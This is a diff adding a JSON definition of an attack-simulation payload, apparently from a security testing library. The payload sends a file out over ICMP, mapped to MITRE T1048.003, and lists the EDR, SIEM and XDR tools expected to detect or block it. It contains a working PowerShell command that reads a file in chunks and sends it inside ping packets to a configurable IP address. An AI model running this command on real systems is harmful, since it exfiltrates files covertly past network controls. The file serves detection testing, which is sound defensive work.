@@ -1,0 +1,57 @@
+{
+  "command_content": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send(\"#{ip_address}\", 1500, $Data) }\n",
+  "command_executor": "psh",
+  "payload_arguments": [
+    {
+      "default_value": "C:\\Windows\\System32\\notepad.exe",
+      "key": "input_file",
+      "type": "text"
+    },
+    {
+      "default_value": "127.0.0.1",
+      "key": "ip_address",
+      "type": "text"
+    }
+  ],
+  "payload_attack_patterns": [
+    "T1048.003"
+  ],
+  "payload_description": "Exfiltration of specified file over ICMP protocol.\n\nUpon successful execution, powershell will utilize ping (icmp) to exfiltrate notepad.exe to a remote address (default 127.0.0.1). Results will be via stdout.\n",
+  "payload_domains": [
+    {
+      "domain_color": "#9933CC",
+      "domain_name": "Data Exfiltration"
+    },
+    {
+      "domain_color": "#389CFF",
+      "domain_name": "Endpoint"
+    },
+    {
+      "domain_color": "#009933",
+      "domain_name": "Network"
+    }
+  ],
+  "payload_elevation_required": false,
+  "payload_execution_arch": "ALL_ARCHITECTURES",
+  "payload_expectations": [
+    "DETECTION",
+    "PREVENTION"
+  ],
+  "payload_expected_security_platforms": {
+    "DETECTION": [
+      "EDR",
+      "SIEM",
+      "XDR"
+    ],
+    "PREVENTION": [
+      "EDR",
+      "XDR"
+    ]
+  },
+  "payload_external_id": "16e5f26d-e92f-4a2f-8894-abbf29087153",
+  "payload_name": "Exfiltration Over Alternative Protocol - ICMP",
+  "payload_platforms": [
+    "Windows"
+  ],
+  "payload_type": "Command"
+}
